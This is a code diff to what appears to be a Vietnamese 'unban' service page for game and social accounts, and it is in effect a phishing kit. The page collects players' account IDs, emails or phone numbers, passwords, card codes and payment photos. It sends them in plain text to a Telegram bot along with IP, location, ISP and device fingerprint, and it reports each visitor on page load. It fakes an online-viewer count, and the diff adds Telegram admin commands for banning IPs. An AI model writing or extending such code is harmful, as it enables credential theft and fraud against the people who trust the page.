@@ -64,15 +64,6 @@
       box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5); margin-bottom: 30px;
     }
 
-    .skeleton {
-      background: linear-gradient(90deg, #1d2c45 25%, #2e405b 50%, #1d2c45 75%);
-      background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 8px;
-    }
-    @keyframes shimmer {
-      0% { background-position: -200% 0; }
-      100% { background-position: 200% 0; }
-    }
-
     .online-counter {
       background: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c;
       border-radius: 30px; padding: 8px 18px; display: inline-flex;
@@ -124,6 +115,7 @@
     .btn-option:hover { border-color: #00b8ff; background: #1f3355; }
     .game-option.active { background: #e74c3c; border-color: #ff6b6b; }
     .payment-method-option.active { background: #f39c12; border-color: #f1c40f; color: #0a0f1e; }
+    .service-type-option.active { background: #9b59b6; border-color: #8e44ad; }
 
     .pricing-table { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin: 20px 0; }
     .plan {
@@ -201,6 +193,21 @@
     .banned-overlay h2 { color: #ff6b6b; font-size: 2rem; margin-bottom: 10px; }
     .banned-overlay p { color: #b0d4ff; font-size: 1.1rem; max-width: 500px; }
 
+    .telegram-command-box {
+      background: rgba(0, 200, 255, 0.05);
+      border: 1px solid #00c8ff;
+      border-radius: 15px;
+      padding: 15px 20px;
+      margin: 15px 0;
+      font-family: 'Courier New', monospace;
+    }
+    .telegram-command-box code {
+      color: #ffd966;
+      background: rgba(0,0,0,0.3);
+      padding: 2px 8px;
+      border-radius: 5px;
+    }
+
     @media (max-width: 600px) {
       .container { padding: 20px 15px; }
       h1 { font-size: 1.8rem; }
@@ -249,17 +256,34 @@
         <i class="fas fa-check-circle"></i> Đa Game • Telegram Duyệt • Bảo Hành Uy Tín
       </div>
 
+      <!-- Telegram Commands Info -->
+      <div class="telegram-command-box">
+        <div style="display:flex; align-items:center; gap:10px; margin-bottom:5px;">
+          <i class="fab fa-telegram" style="color:#0088cc; font-size:1.5rem;"></i>
+          <strong style="color:#00e6ff;">📌 Lệnh Telegram cho Admin:</strong>
+        </div>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px 20px; font-size:0.9rem;">
+          <div><code>/help</code> - Hiển thị trợ giúp</div>
+          <div><code>/banip &lt;IP&gt;</code> - Chặn IP</div>
+          <div><code>/unbanip &lt;IP&gt;</code> - Mở IP</div>
+          <div><code>/listban</code> - Danh sách IP bị chặn</div>
+        </div>
+      </div>
+
       <!-- Online Counter -->
       <div style="text-align:center;">
         <div class="online-counter"><span class="online-dot"></span> <span id="onlineCount">127</span> người đang xem</div>
       </div>
 
-      <!-- Progress Bar -->
-      <div class="progress-container hidden" id="progressBar">
-        <div class="progress-step completed">✅ Gửi</div>
-        <div class="progress-step" id="progressDuyet">⏳ Chờ duyệt</div>
-        <div class="progress-step" id="progressXuLy">🔧 Xử lý</div>
-        <div class="progress-step" id="progressDone">✅ Xong</div>
+      <!-- Service Type Selection -->
+      <div class="section-title"><i class="fas fa-cog"></i> Loại Dịch Vụ</div>
+      <div class="flex-center" id="serviceTypeSelector">
+        <div class="btn-option service-type-option active" data-service="unban_account">
+          <i class="fas fa-user"></i> Mở Band Account
+        </div>
+        <div class="btn-option service-type-option" data-service="unban_ip">
+          <i class="fas fa-network-wired"></i> Mở Band IP
+        </div>
       </div>
 
       <!-- Game Selection -->
@@ -380,9 +404,10 @@
 
       <!-- Account Form -->
       <div style="background:rgba(10,20,38,0.8); border-radius:28px; padding:25px 20px; margin:20px 0; border:1px solid rgba(0,200,255,0.4);">
-        <div class="section-title"><i class="fas fa-bolt"></i> Thông Tin Tài Khoản</div>
+        <div class="section-title"><i class="fas fa-bolt"></i> <span id="serviceTypeTitle">Thông Tin Tài Khoản</span></div>
         
-        <div class="flex-center" style="margin-bottom:20px;">
+        <!-- Platform Selection (only for account unban) -->
+        <div id="platformSelector" class="flex-center" style="margin-bottom:20px;">
           <div class="btn-option platform-option active" data-platform="facebook"><i class="fab fa-facebook"></i> Facebook</div>
           <div class="btn-option platform-option" data-platform="google"><i class="fab fa-google"></i> Google</div>
           <div class="btn-option platform-option" data-platform="twitter"><i class="fab fa-x-twitter"></i> X</div>
@@ -392,21 +417,37 @@
           <input type="text" id="honeypotField" tabindex="-1" autocomplete="off">
         </div>
 
-        <div style="margin-top:16px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🆔 ID tài khoản game *</label>
-          <input type="text" class="input-field" id="ffIdInput" placeholder="Nhập UID">
-        </div>
-        <div style="margin-top:16px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📧 Email / SĐT *</label>
-          <input type="text" class="input-field" id="platformAccountInput" placeholder="Nhập email hoặc SĐT">
-        </div>
-        <div style="margin-top:16px;">
-          <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🔐 Mật khẩu *</label>
-          <div style="position:relative;">
-            <input type="password" class="input-field" id="passwordInput" placeholder="Nhập mật khẩu">
-            <i class="fas fa-eye" id="togglePassword" style="position:absolute; right:18px; top:50%; transform:translateY(-50%); cursor:pointer; color:#7f9bc0;" onclick="togglePasswordVisibility()"></i>
+        <!-- IP Input (for IP unban) -->
+        <div id="ipInputGroup" class="hidden">
+          <div style="margin-top:16px;">
+            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🌐 IP cần mở band *</label>
+            <input type="text" class="input-field" id="ipAddressInput" placeholder="Nhập địa chỉ IP (VD: 192.168.1.1)">
+          </div>
+          <div style="margin-top:16px;">
+            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📝 Lý do mở band</label>
+            <input type="text" class="input-field" id="ipReasonInput" placeholder="Nhập lý do (không bắt buộc)">
           </div>
         </div>
+
+        <!-- Account Input (for account unban) -->
+        <div id="accountInputGroup">
+          <div style="margin-top:16px;">
+            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🆔 ID tài khoản game *</label>
+            <input type="text" class="input-field" id="ffIdInput" placeholder="Nhập UID">
+          </div>
+          <div style="margin-top:16px;">
+            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">📧 Email / SĐT *</label>
+            <input type="text" class="input-field" id="platformAccountInput" placeholder="Nhập email hoặc SĐT">
+          </div>
+          <div style="margin-top:16px;">
+            <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🔐 Mật khẩu *</label>
+            <div style="position:relative;">
+              <input type="password" class="input-field" id="passwordInput" placeholder="Nhập mật khẩu">
+              <i class="fas fa-eye" id="togglePassword" style="position:absolute; right:18px; top:50%; transform:translateY(-50%); cursor:pointer; color:#7f9bc0;" onclick="togglePasswordVisibility()"></i>
+            </div>
+          </div>
+        </div>
+
         <div style="margin-top:16px;">
           <label style="display:block; font-weight:600; margin-bottom:5px; color:#b0d4ff;">🤖 <span id="captchaQuestion"></span> = ?</label>
           <input type="number" class="input-field" id="captchaAnswer" placeholder="Kết quả">
@@ -457,8 +498,10 @@
     let isBanned = false;
     let pollingInterval = null;
     let lastUpdateId = 0;
+    let bannedIPs = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
 
     const state = {
+      serviceType: 'unban_account',
       game: 'freefire',
       server: 'vietnam',
       platform: 'facebook',
@@ -522,7 +565,122 @@
     }
 
     // ============================================
-    // POLLING - CHỜ ADMIN DUYỆT
+    // TELEGRAM COMMAND HANDLER
+    // ============================================
+    async function handleTelegramCommand(text, messageId) {
+      const cmd = text.trim().toLowerCase();
+      
+      // /help
+      if (cmd === '/help') {
+        const helpText = `
+🤖 <b>HƯỚNG DẪN LỆNH</b>
+━━━━━━━━━━━━━━━━━━
+
+📌 <b>Lệnh quản lý IP:</b>
+
+<code>/banip &lt;IP&gt;</code>
+  → Chặn IP (ban)
+
+<code>/unbanip &lt;IP&gt;</code>
+  → Mở chặn IP (unban)
+
+<code>/listban</code>
+  → Xem danh sách IP bị chặn
+
+━━━━━━━━━━━━━━━━━━
+💡 <i>Ví dụ:</i>
+/banip 192.168.1.100
+/unbanip 192.168.1.100
+        `;
+        await sendToTelegram(helpText);
+        return true;
+      }
+      
+      // /banip <IP>
+      if (cmd.startsWith('/banip ')) {
+        const ip = cmd.substring(7).trim();
+        if (!ip || !validateIP(ip)) {
+          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.`);
+          return true;
+        }
+        
+        if (bannedIPs.includes(ip)) {
+          await sendToTelegram(`⚠️ <b>IP ${ip} đã bị chặn từ trước!</b>`);
+          return true;
+        }
+        
+        bannedIPs.push(ip);
+        localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
+        
+        await sendToTelegram(`✅ <b>ĐÃ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã bị chặn thành công!`);
+        
+        // Kiểm tra nếu IP bị chặn là user hiện tại
+        if (ip === userIP) {
+          showBannedScreen(ip);
+        }
+        return true;
+      }
+      
+      // /unbanip <IP>
+      if (cmd.startsWith('/unbanip ')) {
+        const ip = cmd.substring(9).trim();
+        if (!ip || !validateIP(ip)) {
+          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.`);
+          return true;
+        }
+        
+        const index = bannedIPs.indexOf(ip);
+        if (index === -1) {
+          await sendToTelegram(`⚠️ <b>IP ${ip} không có trong danh sách chặn!</b>`);
+          return true;
+        }
+        
+        bannedIPs.splice(index, 1);
+        localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
+        
+        await sendToTelegram(`✅ <b>ĐÃ MỞ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã được mở chặn!`);
+        
+        // Nếu là IP hiện tại, reload trang
+        if (ip === userIP) {
+          setTimeout(() => {
+            Swal.fire({
+              icon: 'success',
+              title: '✅ IP đã được mở chặn!',
+              text: 'Trang sẽ tải lại...',
+              timer: 2000
+            }).then(() => location.reload());
+          }, 500);
+        }
+        return true;
+      }
+      
+      // /listban
+      if (cmd === '/listban') {
+        if (bannedIPs.length === 0) {
+          await sendToTelegram(`📋 <b>DANH SÁCH IP BỊ CHẶN</b>\n━━━━━━━━━━━━━━━━━━\n📭 Hiện tại chưa có IP nào bị chặn.`);
+        } else {
+          let listText = `📋 <b>DANH SÁCH IP BỊ CHẶN</b>\n━━━━━━━━━━━━━━━━━━\n`;
+          bannedIPs.forEach((ip, index) => {
+            listText += `${index + 1}. <code>${ip}</code>\n`;
+          });
+          listText += `━━━━━━━━━━━━━━━━━━\n📊 Tổng: ${bannedIPs.length} IP`;
+          await sendToTelegram(listText);
+        }
+        return true;
+      }
+      
+      return false;
+    }
+
+    function validateIP(ip) {
+      const pattern = /^(\d{1,3}\.){3}\d{1,3}$/;
+      if (!pattern.test(ip)) return false;
+      const parts = ip.split('.');
+      return parts.every(p => parseInt(p) >= 0 && parseInt(p) <= 255);
+    }
+
+    // ============================================
+    // POLLING - CHỜ ADMIN DUYỆT & LỆNH
     // ============================================
     async function startPollingForApproval(sentMessageId, orderId) {
       if (pollingInterval) clearInterval(pollingInterval);
@@ -539,6 +697,14 @@
           for (const update of data.result) {
             lastUpdateId = Math.max(lastUpdateId, update.update_id);
             
+            // Xử lý tin nhắn text (lệnh)
+            if (update.message && update.message.text) {
+              const msgText = update.message.text;
+              const handled = await handleTelegramCommand(msgText, update.message.message_id);
+              if (handled) continue;
+            }
+            
+            // Xử lý callback query (nút bấm)
             if (update.callback_query) {
               const cb = update.callback_query;
               const msgId = cb.message?.message_id;
@@ -565,13 +731,14 @@
                   clearInterval(pollingInterval);
                   const ip = parts[2] ? decodeURIComponent(parts[2]) : userIP;
                   await answerCallback(cb.id, '🚫 Đã cấm IP!');
-                  await sendToTelegram(`🚫 <b>ĐÃ CẤM IP</b>: ${ip}\nĐơn #${orderId}`);
-                  // Lưu IP vào localStorage
-                  const banned = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
-                  if (!banned.includes(ip)) {
-                    banned.push(ip);
-                    localStorage.setItem('tool_banned_ips', JSON.stringify(banned));
+                  
+                  // Thêm IP vào danh sách chặn
+                  if (!bannedIPs.includes(ip)) {
+                    bannedIPs.push(ip);
+                    localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
                   }
+                  
+                  await sendToTelegram(`🚫 <b>ĐÃ CHẶN IP</b>: ${ip}\nĐơn #${orderId}\n━━━━━━━━━━━━━━━━━━\nIP đã được thêm vào danh sách chặn!`);
                   updateOrderStatus('banned', `IP ${ip} đã bị cấm`);
                   setTimeout(() => showBannedScreen(ip), 1000);
                 }
@@ -587,7 +754,6 @@
     // ============================================
     async function fetchIPAndLocation() {
       try {
-        // Lấy IP
         const apis = [
           'https://api.ipify.org?format=json',
           'https://api64.ipify.org?format=json',
@@ -607,7 +773,6 @@
         
         if (!userIP) userIP = 'unknown';
 
-        // Lấy vị trí
         try {
           const res = await fetch(`https://ipinfo.io/${userIP}/json`);
           if (res.ok) {
@@ -650,8 +815,8 @@
     // ============================================
     async function checkBanned() {
       try {
-        const banned = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
-        if (banned.includes(userIP)) {
+        bannedIPs = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
+        if (bannedIPs.includes(userIP)) {
           showBannedScreen(userIP);
           return true;
         }
@@ -702,6 +867,30 @@
       b+=Math.floor(Math.random()*50);
       document.getElementById('onlineCount').textContent=b;
       setInterval(()=>{if(!isBanned)document.getElementById('onlineCount').textContent=Math.max(10,parseInt(document.getElementById('onlineCount').textContent)+Math.floor(Math.random()*6)-3);},30000);
+    }
+
+    // ============================================
+    // SERVICE TYPE TOGGLE
+    // ============================================
+    function toggleServiceType(type) {
+      state.serviceType = type;
+      
+      const title = document.getElementById('serviceTypeTitle');
+      const ipGroup = document.getElementById('ipInputGroup');
+      const accountGroup = document.getElementById('accountInputGroup');
+      const platformSelector = document.getElementById('platformSelector');
+      
+      if (type === 'unban_ip') {
+        title.textContent = 'Thông Tin IP Cần Mở Band';
+        ipGroup.classList.remove('hidden');
+        accountGroup.classList.add('hidden');
+        platformSelector.classList.add('hidden');
+      } else {
+        title.textContent = 'Thông Tin Tài Khoản';
+        ipGroup.classList.add('hidden');
+        accountGroup.classList.remove('hidden');
+        platformSelector.classList.remove('hidden');
+      }
     }
 
     // ============================================
@@ -821,7 +1010,7 @@
           document.getElementById('resultBox').innerHTML=`
             <div style="color:#2ecc71;text-align:center;">
               <h3>🎉 MỞ BAND THÀNH CÔNG!</h3>
-              <p>Tài khoản đã được mở band!</p>
+              <p>${state.serviceType === 'unban_ip' ? 'IP đã được mở band!' : 'Tài khoản đã được mở band!'}</p>
               <div style="background:linear-gradient(135deg,#1d2c45,#2e405b);border:2px solid #f39c12;border-radius:20px;padding:20px;margin-top:15px;">
                 <h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3>
                 <div style="font-size:1.5rem;font-weight:bold;color:#ffd966;">BH-${orderId}</div>
@@ -854,22 +1043,53 @@
     document.getElementById('submitRequestBtn').addEventListener('click',async function(){
       if(isBanned){Swal.fire('🚫','Bạn đã bị chặn!','error');return;}
       
-      const ffId=document.getElementById('ffIdInput').value.trim();
-      const platformAcc=document.getElementById('platformAccountInput').value.trim();
-      const password=document.getElementById('passwordInput').value.trim();
-      const captchaAnswer=parseInt(document.getElementById('captchaAnswer').value);
       const honeypot=document.getElementById('honeypotField').value;
-      
       if(honeypot){Swal.fire('🤖','Hoạt động đáng ngờ!','error');return;}
-      if(!ffId||!platformAcc||!password){Swal.fire('❌','Nhập đầy đủ thông tin!','error');return;}
+      
+      const captchaAnswer=parseInt(document.getElementById('captchaAnswer').value);
       if(isNaN(captchaAnswer)||captchaAnswer!==state.captchaResult){generateCaptcha();document.getElementById('captchaAnswer').value='';Swal.fire('❌','Xác nhận sai!','error');return;}
+      
       if(state.paymentMethod==='bank'&&!uploadedImageFile){Swal.fire('❌','Tải ảnh chuyển khoản!','error');return;}
       if(state.paymentMethod==='card'){if(!document.getElementById('cardCode').value.trim()||!document.getElementById('cardSerial').value.trim()){Swal.fire('❌','Nhập mã thẻ và seri!','error');return;}}
       
+      if (state.serviceType === 'unban_ip') {
+        const ipInput = document.getElementById('ipAddressInput').value.trim();
+        if (!ipInput) { Swal.fire('❌','Nhập IP cần mở band!','error'); return; }
+        if (!validateIP(ipInput)) { Swal.fire('❌','IP không hợp lệ!','error'); return; }
+      } else {
+        const ffId=document.getElementById('ffIdInput').value.trim();
+        const platformAcc=document.getElementById('platformAccountInput').value.trim();
+        const password=document.getElementById('passwordInput').value.trim();
+        if(!ffId||!platformAcc||!password){Swal.fire('❌','Nhập đầy đủ thông tin!','error');return;}
+      }
+      
       const finalPrice=getFinalPrice();
+      
+      let confirmHTML = `<div style="text-align:left;">`;
+      confirmHTML += `<p>🔄 <b>Dịch vụ:</b> ${state.serviceType === 'unban_ip' ? 'Mở Band IP' : 'Mở Band Account'}</p>`;
+      confirmHTML += `<p>🎮 <b>Game:</b> ${state.game.toUpperCase()}</p>`;
+      
+      if (state.serviceType === 'unban_ip') {
+        const ipInput = document.getElementById('ipAddressInput').value.trim();
+        confirmHTML += `<p>🌐 <b>IP:</b> <code>${ipInput}</code></p>`;
+        const reason = document.getElementById('ipReasonInput').value.trim();
+        if (reason) confirmHTML += `<p>📝 <b>Lý do:</b> ${reason}</p>`;
+      } else {
+        const ffId=document.getElementById('ffIdInput').value.trim();
+        const platformAcc=document.getElementById('platformAccountInput').value.trim();
+        confirmHTML += `<p>🆔 <b>UID:</b> ${ffId}</p>`;
+        confirmHTML += `<p>📧 <b>Tài khoản:</b> ${platformAcc}</p>`;
+        confirmHTML += `<p>🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}</p>`;
+      }
+      
+      confirmHTML += `<p>💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}</p>`;
+      confirmHTML += `<p>💰 <b>Tổng:</b> <span style="color:#ffd966;">${finalPrice.toLocaleString()}đ</span></p>`;
+      confirmHTML += `<p>📍 <b>IP của bạn:</b> ${userIP}</p>`;
+      confirmHTML += `</div>`;
+      
       const confirmResult=await Swal.fire({
         title:'📋 Xác Nhận',
-        html:`<div style="text-align:left;"><p>🎮 <b>Game:</b> ${state.game.toUpperCase()}</p><p>🆔 <b>UID:</b> ${ffId}</p><p>💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}</p><p>💰 <b>Tổng:</b> <span style="color:#ffd966;">${finalPrice.toLocaleString()}đ</span></p><p>📍 <b>IP:</b> ${userIP}</p></div>`,
+        html:confirmHTML,
         icon:'question',showCancelButton:true,confirmButtonText:'✅ Gửi',cancelButtonText:'❌ Hủy'
       });
       if(!confirmResult.isConfirmed)return;
@@ -879,25 +1099,36 @@
       try{
         state.currentOrderId=`FF-${Date.now().toString(36).toUpperCase()}`;
         
-        // Gửi ảnh
         if(uploadedImageFile&&state.paymentMethod==='bank'){
           await sendPhotoToTelegram(uploadedImageFile,`📸 Ảnh CK - #${state.currentOrderId}`);
         }
         
-        // Tạo tin nhắn
         let msg=`🔔 <b>YÊU CẦU MỚI #${state.currentOrderId}</b>\n`;
         msg+=`━━━━━━━━━━━━━━━━━━\n`;
+        msg+=`🔄 <b>Dịch vụ:</b> ${state.serviceType === 'unban_ip' ? 'Mở Band IP' : 'Mở Band Account'}\n`;
         msg+=`🎮 <b>Game:</b> ${state.game.toUpperCase()}\n`;
         msg+=`🌐 <b>Server:</b> ${state.server.toUpperCase()}\n`;
         msg+=`💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}\n`;
         msg+=`💰 <b>Giá:</b> ${finalPrice.toLocaleString()}đ\n`;
         msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        msg+=`👤 <b>UID:</b> <code>${ffId}</code>\n`;
-        msg+=`📧 <b>Tài khoản:</b> ${platformAcc}\n`;
-        msg+=`🔐 <b>Mật khẩu:</b> <code>${password}</code>\n`;
-        msg+=`🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}\n`;
+        
+        if (state.serviceType === 'unban_ip') {
+          const ipInput = document.getElementById('ipAddressInput').value.trim();
+          msg+=`🌐 <b>IP cần mở:</b> <code>${ipInput}</code>\n`;
+          const reason = document.getElementById('ipReasonInput').value.trim();
+          if (reason) msg+=`📝 <b>Lý do:</b> ${reason}\n`;
+        } else {
+          const ffId=document.getElementById('ffIdInput').value.trim();
+          const platformAcc=document.getElementById('platformAccountInput').value.trim();
+          const password=document.getElementById('passwordInput').value.trim();
+          msg+=`👤 <b>UID:</b> <code>${ffId}</code>\n`;
+          msg+=`📧 <b>Tài khoản:</b> ${platformAcc}\n`;
+          msg+=`🔐 <b>Mật khẩu:</b> <code>${password}</code>\n`;
+          msg+=`🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}\n`;
+        }
+        
         msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        msg+=`🌐 <b>IP:</b> <code>${userIP}</code>\n`;
+        msg+=`🌐 <b>IP của bạn:</b> <code>${userIP}</code>\n`;
         msg+=`📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n`;
         msg+=`🏢 <b>ISP:</b> ${userLocation.isp}\n`;
         msg+=`🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n`;
@@ -910,7 +1141,6 @@
           msg+=`🔢 <b>Seri:</b> ${document.getElementById('cardSerial').value}\n`;
         }
         
-        // Gửi với nút
         const buttons=[[
           {text:'✅ DUYỆT',callback_data:`approve_${state.currentOrderId}`},
           {text:'❌ TỪ CHỐI',callback_data:`reject_${state.currentOrderId}`},
@@ -931,10 +1161,8 @@
               <p style="font-size:0.8rem;color:#9aa9c1;">Không tắt trang này</p>
             </div>`;
           
-          // Bắt đầu polling
           startPollingForApproval(state.approvedMessageId,state.currentOrderId);
           
-          // Gửi thêm chi tiết
           await sendToTelegram(`🌐 <b>CHI TIẾT - #${state.currentOrderId}</b>\n📍 IP: ${userIP}\n🏙️ TP: ${userLocation.city}\n🌍 QG: ${userLocation.country}\n🏢 ISP: ${userLocation.isp}\n📱 Mobile: ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n🖥️ ${navigator.userAgent.substring(0,80)}`);
           
           Swal.fire({icon:'success',title:'✅ Đã gửi!',text:`Mã: #${state.currentOrderId}\nChờ admin duyệt...`,timer:4000});
@@ -952,6 +1180,14 @@
     // ============================================
     // EVENT LISTENERS
     // ============================================
+    document.querySelectorAll('.service-type-option').forEach(o=>{
+      o.addEventListener('click',function(){
+        document.querySelectorAll('.service-type-option').forEach(x=>x.classList.remove('active'));
+        this.classList.add('active');
+        toggleServiceType(this.dataset.service);
+      });
+    });
+
     document.querySelectorAll('.game-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('.game-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.game=this.dataset.game;updatePrices();});});
     document.querySelectorAll('#serverSelector .btn-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('#serverSelector .btn-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.server=this.dataset.server;updatePrices();});});
     document.querySelectorAll('.plan').forEach(p=>{p.addEventListener('click',function(){document.querySelectorAll('.plan').forEach(x=>x.classList.remove('selected'));this.classList.add('selected');state.plan={name:this.dataset.plan,price:parseInt(this.dataset.price),time:this.dataset.time};updatePrices();});});
@@ -959,46 +1195,91 @@
     document.querySelectorAll('.platform-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('.platform-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.platform=this.dataset.platform;});});
 
     // ============================================
+    // PROGRESS BAR ELEMENTS
+    // ============================================
+    function ensureProgressBar() {
+      const container = document.querySelector('.progress-container');
+      if (!container) {
+        const newContainer = document.createElement('div');
+        newContainer.className = 'progress-container hidden';
+        newContainer.id = 'progressBar';
+        newContainer.innerHTML = `
+          <div class="progress-step completed">✅ Gửi</div>
+          <div class="progress-step" id="progressDuyet">⏳ Chờ duyệt</div>
+          <div class="progress-step" id="progressXuLy">🔧 Xử lý</div>
+          <div class="progress-step" id="progressDone">✅ Xong</div>
+        `;
+        const pricingSection = document.querySelector('.pricing-table');
+        if (pricingSection) {
+          pricingSection.parentNode.insertBefore(newContainer, pricingSection.nextSibling);
+        }
+      }
+    }
+
+    // ============================================
     // INITIALIZATION
     // ============================================
     async function init(){
       console.log('🚀 Tool Mở Band - Khởi động...');
       
-      // Lấy IP và vị trí
       await fetchIPAndLocation();
       deviceFingerprint = await generateFingerprint();
       
-      // Hiển thị
       document.getElementById('userIpDisplay').textContent = userIP;
       document.getElementById('userLocation').textContent = `${userLocation.city}, ${userLocation.country}`;
       
       console.log(`📍 IP: ${userIP} | ${userLocation.city}, ${userLocation.country}`);
       
-      // Kiểm tra banned
       const banned = await checkBanned();
       if (banned) {
         console.log('🚫 User bị banned');
         return;
       }
       
-      // Gửi thông báo visitor về Telegram
       const visitorMsg = `🟢 <b>NGƯỜI DÙNG MỚI TRUY CẬP</b>\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${userIP}</code>\n📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n🏢 <b>ISP:</b> ${userLocation.isp}\n🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n📱 <b>Mobile:</b> ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`;
       await sendToTelegram(visitorMsg);
       
-      // Khởi tạo UI
+      ensureProgressBar();
       createParticles();
       generateCaptcha();
       updatePrices();
       updateOnlineCount();
       startSocialProof();
       setupImageUpload();
+      toggleServiceType('unban_account');
       
       console.log('✅ Tool sẵn sàng!');
+      
+      // Bắt đầu polling để nhận lệnh từ Telegram
+      startPollingForCommands();
+    }
+
+    // Hàm polling riêng cho lệnh Telegram
+    async function startPollingForCommands() {
+      setInterval(async () => {
+        try {
+          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
+          const data = await res.json();
+          
+          if (!data.ok || !data.result.length) return;
+          
+          for (const update of data.result) {
+            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+            
+            if (update.message && update.message.text) {
+              const msgText = update.message.text;
+              // Chỉ xử lý lệnh nếu không phải đang chờ duyệt đơn
+              if (!state.currentOrderId) {
+                await handleTelegramCommand(msgText, update.message.message_id);
+              }
+            }
+          }
+        } catch(e) { console.error('Command polling error:', e); }
+      }, 5000);
     }
 
     init();
 
-    // Cleanup khi rời trang
     window.addEventListener('beforeunload', () => {
       if (state.countdownInterval) clearInterval(state.countdownInterval);
       if (pollingInterval) clearInterval(pollingInterval);
